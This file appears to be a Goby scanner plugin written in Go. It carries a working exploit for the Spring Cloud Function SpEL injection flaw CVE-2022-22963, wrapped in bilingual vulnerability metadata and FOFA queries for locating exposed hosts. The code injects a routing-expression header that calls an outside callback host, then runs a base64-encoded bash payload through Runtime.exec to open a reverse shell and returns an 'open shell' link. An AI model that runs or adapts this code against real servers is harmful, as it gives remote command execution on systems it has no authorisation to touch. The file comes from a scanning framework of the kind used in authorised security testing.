package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Spring Cloud Function functionRouter Api SPEL  Vulnerability (CVE-2022-22963)",
    "Description": "<p>Spring cloud function is a function calculation framework based on spring boot. By abstracting the transmission details and infrastructure, it retains familiar development tools and development processes for developers, so that developers can focus on realizing business logic, so as to improve development efficiency.</p><p>There is spring in the HTTP request header for accessing spring cloud function cloud. function. Routing expression parameter, whose spel expression can be injected and executed through StandardeValuationContext parsing. Eventually, an attacker can perform remote command execution through this vulnerability.</p>",
    "Impact": "<p>Spring Cloud Function SPEL Vulnerability</p>",
    "Recommendation": "<p>Refer to the scope of the vulnerability for troubleshooting. The official has issued a patch for this vulnerability. Please repair the affected users as soon as possible.</p><p>Official link: <a href=\"https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f\">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p><p>Note: at present, the official has not released a new version, please continue to pay attention and update in time: <a href=\"https://github.com/spring-cloud/spring-cloud-function/tags\">https://github.com/spring-cloud/spring-cloud-function/tags</a></p>",
    "Product": "Spring Cloud Function",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Spring Cloud Function SPEL functionRouter 接口远程命令执行漏洞（CVE-2022-22963）",
            "Product": "Spring Cloud Function",
            "Description": "<p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，通过对传输细节和基础架构进行抽象，为开发人员保留熟悉的开发工具和开发流程，使开发人员专注在实现业务逻辑上，从而提升开发效率。</p><p>访问Spring Cloud Function的 HTTP请求头中存在 spring.cloud.function.routing-expression参数，其 SpEL表达式可进行注入攻击，并通过 StandardEvaluationContext解析执行。最终，攻击者可通过该漏洞进行远程命令执行。</p>",
            "Recommendation": "<p>参考漏洞影响范围进行排查，官方已针对此漏洞发布修复补丁，请受影响的用户尽快修复。</p><p>官方链接：<a href=\"https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f\">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p><p>注：目前官方暂未发布新版本，请持续关注并及时更新：<a href=\"https://github.com/spring-cloud/spring-cloud-function/tags\">https://github.com/spring-cloud/spring-cloud-function/tags</a></p>",
            "Impact": "<p><span style=\"font-size: 16px;\">该漏洞可通过对 SPEL表达式进行注入从而引发远程命令执行。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Spring Cloud Function functionRouter Api SPEL  Vulnerability (CVE-2022-22963)",
            "Product": "Spring Cloud Function",
            "Description": "<p>Spring cloud function is a function calculation framework based on spring boot. By abstracting the transmission details and infrastructure, it retains familiar development tools and development processes for developers, so that developers can focus on realizing business logic, so as to improve development efficiency.</p><p>There is spring in the HTTP request header for accessing spring cloud function&nbsp;cloud.&nbsp;function.&nbsp;Routing expression parameter, whose spel expression can be injected and executed through StandardeValuationContext parsing.&nbsp;Eventually, an attacker can perform remote command execution through this vulnerability.</p>",
            "Recommendation": "<p>Refer to the scope of the vulnerability for troubleshooting. The official has issued a patch for this vulnerability. Please repair the affected users as soon as possible.</p><p>Official link:&nbsp;<a href=\"https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f\">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p><p>Note: at present, the official has not released a new version, please continue to pay attention and update in time:&nbsp;<a href=\"https://github.com/spring-cloud/spring-cloud-function/tags\">https://github.com/spring-cloud/spring-cloud-function/tags</a></p>",
            "Impact": "<p>Spring Cloud Function SPEL Vulnerability</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "((header=\"Server: Netty@SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\")) && body!=\"couchdb\") || title=\"SpringBootAdmin-Server\" || body=\"SpringBoot\"",
    "GobyQuery": "((header=\"Server: Netty@SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\")) && body!=\"couchdb\") || title=\"SpringBootAdmin-Server\" || body=\"SpringBoot\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://github.com/spring-cloud/spring-cloud-function",
    "DisclosureDate": "2022-03-26",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-22963"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202203-2333"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10262"
}`

	bashBase64CMD := func(cmd string) string {
		cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		return `bash -c {echo,` + cmdBase64 + `}|{base64,-d}|{bash,-i}`
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			functionRouterCFG := httpclient.NewPostRequestConfig("/functionRouter")
			functionRouterCFG.VerifyTls = false
			functionRouterCFG.FollowRedirect = false
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			functionRouterCFG.Header.Store("spring.cloud.function.routing-expression", "new java.net.URL(\"http://"+checkUrl+"\").getContent()")
			functionRouterCFG.Data = goutils.RandomHexString(8)
			httpclient.DoHttpRequest(u, functionRouterCFG)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					payload := bashBase64CMD(cmd)
					functionRouterCFG := httpclient.NewPostRequestConfig("/functionRouter")
					functionRouterCFG.VerifyTls = false
					functionRouterCFG.FollowRedirect = false
					functionRouterCFG.Data = goutils.RandomHexString(8)
					functionRouterCFG.Header.Store("spring.cloud.function.routing-expression", "T(java.lang.Runtime).getRuntime().exec(\""+payload+"\")")
					httpclient.DoHttpRequest(expResult.HostInfo, functionRouterCFG)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
					}
				}
			}
			return expResult
		},
	))
}
